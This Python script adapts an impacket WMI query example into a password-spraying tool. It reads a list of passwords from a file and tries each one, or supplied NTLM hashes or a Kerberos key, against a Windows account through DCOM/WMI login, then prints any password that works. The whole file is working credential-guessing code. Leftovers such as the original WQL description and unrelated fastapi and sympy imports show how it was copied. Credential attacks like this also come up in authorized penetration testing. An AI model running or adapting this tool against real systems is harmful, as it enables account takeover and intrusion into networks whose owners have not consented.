from __future__ import division
from __future__ import print_function
import argparse
import sys
import os
import logging
from fastapi import File

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
from sympy import Not

def password_Check(options,spraying_Pass=None):
    domain, username, password, address = parse_target(options.target)
    if spraying_Pass == None:
        pass
    else:
        password = spraying_Pass

    #print(password)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    try:
        dcom = DCOMConnection(address, username, password, domain, lmhash, nthash, options.aesKey, oxidResolver=True,
                              doKerberos=options.k, kdcHost=options.dc_ip)

        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin(options.namespace, NULL, NULL)
        if options.rpc_auth_level == 'privacy':
            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        elif options.rpc_auth_level == 'integrity':
            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)

        iWbemLevel1Login.RemRelease()

        print("\r\n [+] password correct: %s \r\n"%password)

        iWbemServices.RemRelease()
        dcom.disconnect()
    except Exception as e:
        logging.error(str(e))
        try:
            dcom.disconnect()
        except:
            pass

def password_Spraying(options):
    with open(options.pw_file,'r') as raw_pw:
        passwords  = raw_pw.readlines()
    for i in passwords:
        password_Check(options,spraying_Pass=i.strip("\r\n"))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help = True, description = "Executes WQL queries and gets object descriptions "
                                                                    "using Windows Management Instrumentation.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-pw-file', action='store', help='password file')
    parser.add_argument('-namespace', action='store', default='//./root/cimv2', help='namespace name (default //./root/cimv2)')
    parser.add_argument('-file', type=argparse.FileType('r'), help='input file with commands to execute in the WQL shell')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-com-version', action='store', metavar = "MAJOR_VERSION:MINOR_VERSION", help='DCOM version, '
                        'format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-rpc-auth-level', choices=['integrity', 'privacy','default'], nargs='?', default='default',
                       help='default, integrity (RPC_C_AUTHN_LEVEL_PKT_INTEGRITY) or privacy '
                            '(RPC_C_AUTHN_LEVEL_PKT_PRIVACY). For example CIM path "root/MSCluster" would require '
                            'privacy level by default)')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
 
    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    #domain, username, password, address = parse_target(options.target)
    if options.pw_file is None :
        password_Check(options)

    if options.pw_file is not None:
        password_Spraying(options)
